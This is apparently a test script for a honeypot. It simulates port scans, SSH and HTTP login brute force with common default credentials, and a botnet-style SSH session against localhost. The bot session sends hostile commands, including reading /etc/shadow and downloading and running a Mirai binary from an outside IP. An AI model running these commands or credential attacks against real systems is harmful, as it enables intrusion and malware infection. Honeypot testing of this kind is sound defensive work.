"""攻击行为模拟器:模拟几种典型的内网横向扫描/入侵行为,验证蜜罐记录效果。

用法:  python tests/simulate.py [场景名|all]
场景:  portscan / ssh_brute / ssh_bot / ssh_human / http_scan / http_login / all
"""
import asyncio
import http.client
import inspect
import json
import socket
import sys
import time

import asyncssh

HOST = "127.0.0.1"
SSH_PORT = 2222
HTTP_PORT = 8080


def log(msg):
    print(f"[sim] {msg}", flush=True)


# ---------- 1. TCP 端口扫描(SYN 做不到,用 connect 扫描) ----------

def scenario_portscan():
    log("场景:端口扫描 —— 快速探测常见端口")
    ports = [21, 22, 23, 25, 80, 110, 143, 443, 445, 1433, 3306, 3389,
             6379, 8080, 8443, 2222, 8081]
    for p in ports:
        s = socket.socket()
        s.settimeout(0.4)
        try:
            s.connect((HOST, p))
            log(f"  {p}/tcp open")
        except OSError:
            pass
        finally:
            s.close()
        time.sleep(0.05)


# ---------- 2. SSH 口令爆破 ----------

CREDS = [
    ("root", "root"), ("root", "123456"), ("root", "password"), ("root", "toor"),
    ("admin", "admin"), ("admin", "123456"), ("ubuntu", "ubuntu"),
    ("test", "test"), ("oracle", "oracle"), ("root", "P@ssw0rd"),
    ("root", "admin123"), ("deploy", "deploy123"),
]


async def scenario_ssh_brute():
    log("场景:SSH 口令爆破 —— 字典攻击常见账号口令")
    for u, p in CREDS:
        try:
            async with asyncssh.connect(HOST, SSH_PORT, username=u, password=p,
                                        known_hosts=None,
                                        login_timeout=5) as conn:
                            # 蜜罐接受一切口令;真实爆破者发现"成功"会再开会话深入
                            pass
        except Exception as e:
            log(f"  {u}/{p} -> {type(e).__name__}")
        await asyncio.sleep(0.15)
    log(f"  已尝试 {len(CREDS)} 组口令")


# ---------- 3. SSH 僵尸网络式入侵(自动化脚本行为) ----------

BOT_COMMANDS = [
    "uname -a",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "whoami",
    "ifconfig",
    "netstat -an",
    "ps aux",
    "cd /tmp",
    "wget http://45.132.9.21/bins/mirai.x86",
    "chmod +x mirai.x86",
    "./mirai.x86",
    "history",
    "exit",
]


async def scenario_ssh_bot():
    log("场景:SSH 僵尸网络式入侵 —— 登录后自动侦察 + 下载载荷")
    async with asyncssh.connect(HOST, SSH_PORT, username="root", password="123456",
                                known_hosts=None) as conn:
        async with conn.create_process(term_type="xterm") as proc:
            await asyncio.sleep(0.4)
            for cmd in BOT_COMMANDS:
                proc.stdin.write(cmd + "\n")
                await asyncio.sleep(0.3)
            await asyncio.sleep(0.8)


# ---------- 4. SSH 真人式操作(慢速、带打错回删,回放效果最好) ----------

async def _type(proc, text, wpm_delay=(0.06, 0.16)):
    """模拟真人逐字敲入,含一次打错+退格。"""
    import random
    typo_at = random.randint(3, max(3, len(text) - 2)) if len(text) > 6 else -1
    for i, ch in enumerate(text):
        proc.stdin.write(ch)
        await asyncio.sleep(random.uniform(*wpm_delay))
        if i == typo_at:
            proc.stdin.write("x")
            await asyncio.sleep(0.25)
            proc.stdin.write("\x7f")  # backspace
            await asyncio.sleep(0.2)
    proc.stdin.write("\n")


async def scenario_ssh_human():
    log("场景:SSH 真人式交互 —— 慢速敲入、打错回删、翻文件")
    async with asyncssh.connect(HOST, SSH_PORT, username="deploy", password="deploy123",
                                known_hosts=None) as conn:
        async with conn.create_process(term_type="xterm") as proc:
            await asyncio.sleep(0.6)
            for cmd in ["ls -la", "pwd", "cat /etc/os-release", "cd /var/log",
                        "ls", "cat auth.log", "cd ~", "history", "exit"]:
                await _type(proc, cmd)
                await asyncio.sleep(0.7)
            await asyncio.sleep(0.8)


# ---------- 5. HTTP 路径扫描(dirb 式) ----------

HTTP_PATHS = [
    "/", "/admin", "/admin/login", "/wp-login.php", "/wp-admin/", "/phpmyadmin/",
    "/.git/config", "/.env", "/manager/html", "/solr/", "/actuator/health",
    "/robots.txt", "/backup.zip", "/console/", "/api/v1/users",
]


def scenario_http_scan():
    log("场景:HTTP 路径扫描 —— 探测常见后台/敏感文件")
    for path in HTTP_PATHS:
        try:
            c = http.client.HTTPConnection(HOST, HTTP_PORT, timeout=3)
            c.request("GET", path, headers={
                "User-Agent": "Mozilla/5.0 (compatible; dirbuster/1.2)",
                "Accept": "*/*"})
            r = c.getresponse()
            r.read()
            log(f"  GET {path} -> {r.status}")
            c.close()
        except OSError:
            pass
        time.sleep(0.1)


# ---------- 6. HTTP 登录爆破 ----------

def scenario_http_login():
    log("场景:HTTP 登录爆破 —— 对登录页 POST 常见口令")
    creds = [("admin", "admin"), ("admin", "123456"), ("admin", "password"),
             ("admin", "admin123"), ("root", "root"), ("test", "test")]
    for u, p in creds:
        try:
            c = http.client.HTTPConnection(HOST, HTTP_PORT, timeout=3)
            body = f"username={u}&password={p}"
            c.request("POST", "/login", body=body, headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
            r = c.getresponse()
            r.read()
            log(f"  POST /login {u}/{p} -> {r.status}")
            c.close()
        except OSError:
            pass
        time.sleep(0.15)


SCENARIOS = {
    "portscan": ("端口扫描", scenario_portscan),
    "ssh_brute": ("SSH 口令爆破", scenario_ssh_brute),
    "ssh_bot": ("SSH 僵尸网络式入侵", scenario_ssh_bot),
    "ssh_human": ("SSH 真人式交互", scenario_ssh_human),
    "http_scan": ("HTTP 路径扫描", scenario_http_scan),
    "http_login": ("HTTP 登录爆破", scenario_http_login),
}


async def amain(names):
    for name in names:
        fn = SCENARIOS[name][1]
        if inspect.iscoroutinefunction(fn):
            await fn()
        else:
            fn()
        await asyncio.sleep(0.5)


if __name__ == "__main__":
    names = sys.argv[1:] or ["all"]
    if names == ["all"]:
        names = list(SCENARIOS)
    for n in names:
        if n not in SCENARIOS:
            sys.exit(f"未知场景 {n},可选: {', '.join(SCENARIOS)}")
    asyncio.run(amain(names))
    log("全部场景执行完毕")
